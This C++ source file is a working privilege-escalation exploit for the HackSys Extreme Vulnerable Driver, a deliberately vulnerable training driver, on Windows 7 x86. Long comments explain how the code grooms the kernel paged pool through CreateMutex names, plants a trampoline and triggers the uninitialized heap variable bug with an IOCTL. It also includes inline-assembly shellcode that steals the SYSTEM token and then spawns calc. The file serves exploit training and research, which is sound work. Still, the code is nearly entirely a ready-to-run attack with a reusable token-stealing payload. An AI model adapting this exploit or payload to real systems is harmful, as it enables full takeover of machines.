// cl.exe exploit.cpp
// Targeting: HackSys Extreme Vulnerable Driver as of September 5, 2016 (UninitializedHeapVariable.c rev. 6f54d9a)
// Tested: Windows 7 x86, fully patched as of September 2016

//#define _DEBUG

#ifdef _DEBUG
#define BREAKPOINT __asm { int 3 }
#else
#define BREAKPOINT
#endif

#define HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80C, METHOD_NEITHER, FILE_ANY_ACCESS)
#define N_ALLOCATIONS 512
#define CHUNK_SIZE 0xf8
#define MUTEX_NAME_LEN (CHUNK_SIZE-8)/2

#define STATUS_UNSUCCESSFUL 0xC0000001
#define STATUS_SUCCESS 0

// Windows 7 SP1 x86 Offsets
#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

#include <stdio.h>
#include <time.h>
#include <windows.h>

typedef NTSTATUS WINAPI NtAllocateVirtualMemory_t(IN HANDLE     ProcessHandle,
                                                         IN OUT PVOID  *BaseAddress,
                                                         IN ULONG      ZeroBits,
                                                         IN OUT PULONG AllocationSize,
                                                         IN ULONG      AllocationType,
                                                         IN ULONG      Protect);

void TokenStealingPayloadWin7Generic();


int main(int argc, char *argv[])
{
	NtAllocateVirtualMemory_t * NtAllocateVirtualMemory = NULL;
	ULONG CallResult = 0;
	SIZE_T RegionSize = 0x1000;
	PVOID BaseAddress = NULL;
	ULONG PivotAddress = 0;

	char aMutexName[MUTEX_NAME_LEN]; 
	HANDLE hMutex[N_ALLOCATIONS];

	HANDLE hDevice = NULL;
//	ULONG MagicValue = 0xBAD0B0B0; // the expected magic value - no trigger
	ULONG MagicValue = 0xBAD0F00D; // trigger uninitialized heap variable condition
	ULONG BytesReturned = 0;

	PVOID EopPayload = &TokenStealingPayloadWin7Generic;
	STARTUPINFO StartupInfo = {0};
	PROCESS_INFORMATION ProcessInfo = {0};

	printf("\nElevation of Privilege Exploit for HackSys Extreme Vulnerable Driver\nUninitialized Heap Variable Vulnerability Challenge\nby Alisa Esage\n\n");

	printf ("              ,-.       _,---._ __  / \\\n");
	printf ("             /  )    .-'       `./ /   \\\n");
	printf ("            (  (   ,'            `/    /|\n");
	printf ("             \\  `-\"             \\'\\   / |\n");
	printf ("              `.              ,  \\ \\ /  |\n");
	printf ("               /`.          ,'-`----Y   |\n");
	printf ("              (            ;        |   '\n");
	printf ("              |  ,-.    ,-'         |  /\n");
	printf ("              |  | (   |       Win  | /\n");
	printf ("              )  |  \\  `.___________|/\n");
	printf ("              `--'   `--'\n\n");


	__try {

		printf("[-] Init...\n");

		srand((unsigned)time(NULL));

		if(!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST))
		{
			printf("[!] Failed to set THREAD_PRIORITY_HIGHEST: error 0x%X\n", GetLastError());
			exit(0);
		}

		NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t *)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtAllocateVirtualMemory");
		if (!NtAllocateVirtualMemory) 
		{
			printf("[!] Failed to get the address of NtAllocatedVirtualMemory, error: 0x%X\n", GetLastError());
			exit(0);
		}
		printf("[*] NtAllocateVirtualMemory = 0x%p\n", NtAllocateVirtualMemory);

		printf("[-] Allocating memory for the payload...\n");

		/* 
		   We cannot simply HeapAlloc() here, because this would yield a random memory address, 
		   while the exploit requires an address embeddable in a UNICODE string produced from an ASCII string,
		   specifically, in the form 0x00aa00bb.
		*/

		for (int i=0; i<23; i++) 
		{
			// generate a random UNICODE compatible, ASCII friendly memory address
			PivotAddress = ('a'+rand()%26<<16)+'a'+rand()%26;

			printf("[-] Let PivotAddress = 0x%p\n", (PVOID)PivotAddress);

			BaseAddress = (PVOID)PivotAddress;
			CallResult = NtAllocateVirtualMemory((HANDLE)0xFFFFFFFF,
				&BaseAddress,
				0,
				&RegionSize,
				MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
       		     	    	PAGE_EXECUTE_READWRITE);			

			if (CallResult != STATUS_SUCCESS) 
				printf("[!] Failed to allocate memory at BaseAddress 0x%p, error: 0x%X\n", BaseAddress, CallResult);
			else {
				printf("[*] Allocated memory at BaseAddress 0x%p\n", BaseAddress);	
				break;
			}
		}

		printf("[*] Shellcode at address 0x%p\n", EopPayload);
		printf("[-] Planting shellcode trampoline at address 0x%p...\n", (PVOID)PivotAddress);

		*(PBYTE)PivotAddress = 0x68; 	 // push 32b imm
		*(PULONG)(PivotAddress+1) = (ULONG)EopPayload;
		*(PBYTE)(PivotAddress+5) = 0xc3; // ret
		

		printf("[-] Pool time\n");

		/* 

		   It is useful to think of Uninitialized Memory bugs as 'reverse use-after-frees', in that we must 
		   prepare the fake vulnerable object, or a specially crafted memory chunk, before it's ever allocated by the program.
		   In this case we have an vulnerable object of size 0xf0 (de facto pool chunk size 0xf8, or 0x1f in blocks),
		   holding a virtual function address at offset +4. Any mistake in the exploit would cause a BSOD, therefore
		   we must groom the pool very carefully, in order to guarantee that the vulnerable object will receive a specially
		   prepared memory contents.

		   So, we want to precisely control the pool allocator in such a way that, at the moment when the target driver 
		   requests a memory allocation for the vulnerable object, a specially prepared memory chunk would be provided
		   by the operating system's kernel memory manager. To achieve this, we will rely on kernel pool allocator's 
		   highly deterministic memory optimization behavior.

		   We know that PagedPool memory chunks of size below 0x20 blocks will be allocated from the node's PagedPools' 
		   LookAside lists in a round-robin manner, each list operating as a LIFO queue. An uniprocessor system has 4 PagedPools, 
		   and a multiprocessor system has 1 PagedPool per processor. 
		   Thus, we must allocate/condition a big enough number of memory chunks, and then free every 8th allocation at least, 
		   that will populate the LookAside list in each PagedPool, while preventing freed chunks from coalescing. 
		   We do not need to care about the DELAYED_FREE heap flag in this case, as it's not applicable to LookAside lists; 
		   but still, we'll make sure that the number of per-pool frees will be >32 that's required to trigger ExDeferredFreePool().
		   With all that in place, the probability of the vulnerable code receiving one of specially crafted memory chunks is ~%100, 
		   less theoretical allowance for an possible system-wide memory race condition, that could either eat up all the 
		   prepared memory chunks, or spam the LookAside lists with wrong ones. A race condition problem could then be waived
		   with some memory pressure.

		   On a vanilla system, the race condition for the target CHUNK_SIZE is not particularly high, so I decided to not apply 
		   any memory pressure on this. 

		   For a production level exploit, it would be advisable to apply additional memory pressure on the pool allocator
		   in two directions, in parrallel with triggering the vulnerability:
		   1. take up free chunks of target size and maybe above in a loop 
		   2. populate the LookAside lists at a higher rate than p.1.

		   Thus we would minimize the probability of a wrong memory chunk being acquired by the vulnerable kernel driver.



		   It seems more difficult to control memory contents in kernel mode than in user mode exploits, due to the 
		   additional constraint that an obscure kernel memory allocation functionality must be reached and controlled 
		   indirectly via an userland front-end. One way to achieve this is to trigger the creation of kernel objects 
		   by calling a suitable usermode API. Majority of kernel objects are of fixed size, and their contents are fixed
		   or unreachable from usermode.

		   There is not much of known (published) techniques explaining how to control the PagedPool.
		   CreatePrivateNamespace() looks good at first, however its object's base size turns out to be too big to fit the 
		   target CHUNK_SIZE.
		   NtCreateSymbolicLink() unfortunately requires Administrator privileges (which interestingly, used to be documented
		   in Windows Internals 5th edition, but removed from the 6th edition).

		   So, I did some research, and found this gem: CreateMutex(). Effectively, this allows to create/free
		   PagedPool memory allocations of possible size ~10..MAX_PATH*2 bytes, and to control their memory contents 
		   to the extent of an arbitrary UNICODE string contained inside. 

		   Check out the CreateMutex()->...->ObpCaptureObjectCreateInformation()->...->ExAllocatePoolWithTag() call chain.

		*/

		printf("[-] Attempting to make %u PagedPool kernel memory allocations...\n", N_ALLOCATIONS);

		for (int i=0; i<N_ALLOCATIONS; i++)
		{
			for (int i=0; i<MUTEX_NAME_LEN; i++)
				aMutexName[i] = 'a' + rand()%26;
			aMutexName[MUTEX_NAME_LEN-1] = '\0';

			// fix the shellcode trampoline:
			aMutexName[2] = PivotAddress&0xff;
			aMutexName[3] = PivotAddress>>16;

			hMutex[i] = CreateMutex(NULL, TRUE, aMutexName);

			if (!hMutex[i])
			{
				printf("[!] Create Mutex failed: error 0x%X\n", GetLastError());
				exit(0);
			}
		}

		printf("[-] Freeing some non-contiguous chunks...\n");

		for (int i=0; i<N_ALLOCATIONS; i+=8)
			CloseHandle(hMutex[i]);


		printf("[-] Triggering the uninitialized heap variable condition...\n");

		hDevice = CreateFile("\\\\.\\HackSysExtremeVulnerableDriver",
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE,
			NULL,
			OPEN_EXISTING,
			0,
			NULL);

		if (!hDevice)
		{
			printf("[!] Failed to open hacksysextremevulnerabledriver.sys device handle: error 0x%X\n", GetLastError());
			exit(0);
		}

		printf("[*] Device handle: 0x%X\n", (ULONG)hDevice);

		printf("[-] Sending IOCTL to trigger the vulnerability...\n");
	
		CallResult = DeviceIoControl(hDevice,
			HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE,
			(LPVOID)&MagicValue,
			0,
			NULL,
			0,
			&BytesReturned,
			NULL);

		if (!CallResult)
		{
			printf("[!] Failed to send IOCTL: error 0x%X\n", GetLastError());
			exit(0);
		}	

		printf("[*] Bytes returned: %u\n", BytesReturned);
	
		printf("[-] Starting calc.exe...\n");

		StartupInfo.wShowWindow = SW_SHOW;
		StartupInfo.cb          = sizeof(STARTUPINFO);
		StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;

		CallResult = CreateProcess(NULL,
			"calc",
			NULL,
			NULL,
			FALSE,
			CREATE_BREAKAWAY_FROM_JOB,
			NULL,
			NULL,
			&StartupInfo,
			&ProcessInfo);

		printf("[*] calc.exe PID = %u\n", ProcessInfo.dwProcessId);

		printf("[;] En joy as SYSTEM or not?\n");

	}

	__except (EXCEPTION_EXECUTE_HANDLER) {
		printf("[!] Exception: 0x%X\n", GetLastError());	
	 	exit(0);
	}
}

void TokenStealingPayloadWin7Generic()
{

// thanks to Ashfaq Ansary (HackSys) for the detailed comments (original technique by Cesar Cerrudo)
// TODO: fix the stolen Token's reference count, otherwise multiple shellcode runs will crash the system.

__asm {
        pushad                               ; Save registers state

        ; Start of Token Stealing Stub
        xor eax, eax                         ; Set ZERO
        mov eax, fs:[eax + KTHREAD_OFFSET]   ; Get nt!_KPCR.PcrbData.CurrentThread
                                             ; _KTHREAD is located at FS:[0x124]

        mov eax, [eax + EPROCESS_OFFSET]     ; Get nt!_KTHREAD.ApcState.Process

        mov ecx, eax                         ; Copy current process _EPROCESS structure

        mov edx, SYSTEM_PID                  ; WIN 7 SP1 SYSTEM process PID = 0x4

        SearchSystemPID:
            mov eax, [eax + FLINK_OFFSET]    ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
            sub eax, FLINK_OFFSET
            cmp [eax + PID_OFFSET], edx      ; Get nt!_EPROCESS.UniqueProcessId
            jne SearchSystemPID

        mov edx, [eax + TOKEN_OFFSET]        ; Get SYSTEM process nt!_EPROCESS.Token
        mov [ecx + TOKEN_OFFSET], edx        ; Replace target process nt!_EPROCESS.Token
                                             ; with SYSTEM process nt!_EPROCESS.Token
        ; End of Token Stealing Stub

        popad                                ; Restore registers state
    }
}

/*

	I recommend the following fundamental works, as a solid foundation for Windows kernel vulnerability research:
	0. Windows Internals (chapters on System Mechanisms and I/O system, in particular).
	1. Tarjej Mandt's Windows 7 pool internals paper (essential).
	2. All publications by j00ru, esp. some of the older papers from the HITB magazine. 
	3. HackSys exploit code, which is neat.

*/
